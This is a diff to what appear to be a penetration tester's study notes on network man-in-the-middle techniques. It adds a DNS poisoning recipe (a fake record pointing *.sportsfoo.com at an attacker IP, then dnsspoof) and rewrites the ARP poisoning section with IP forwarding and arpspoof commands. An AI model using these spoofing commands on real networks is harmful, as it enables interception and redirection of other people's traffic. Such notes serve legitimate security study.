@@ -16,12 +16,42 @@
 - Screenshots
 - Delete certs
 - [[backdoor\|Backdoor]]
+# DNS poisoning
+Create a file to emulate DNS record
+```shell
+echo "ATTAQUER_IP *.sportsfoo.com" > dns
+```
+
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+
+```shell
+dnsspoof -i eth1 -f dns
+```
+
+</div></div>
+
+
 # ARP poisoning
-## arpspoof
-- arpspoof -i interface -t IP1 IP2
-- arpspoof -i interface -t IP2 IP1
-- IP1 is the address of the access point or gateway
-- IP2 is the target system
+```shell
+echo 1 > /proc/sys/net/ipv4/ip forward
+```
+
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+- [[MITM attack\|MITM attack]]
+
+| Option                                                                   | Description                                                                   |
+| ------------------------------------------------------------------------ | ----------------------------------------------------------------------------- |
+| `arpspoof -i interface -t IP1 IP2`<br>`arpspoof -i interface -t IP2 IP1` | IP1 is the address of the access point or gateway<br>IP2 is the target system |
+
+
+</div></div>
+
 
 ## Cain & Abel
 - Scan MAC adress
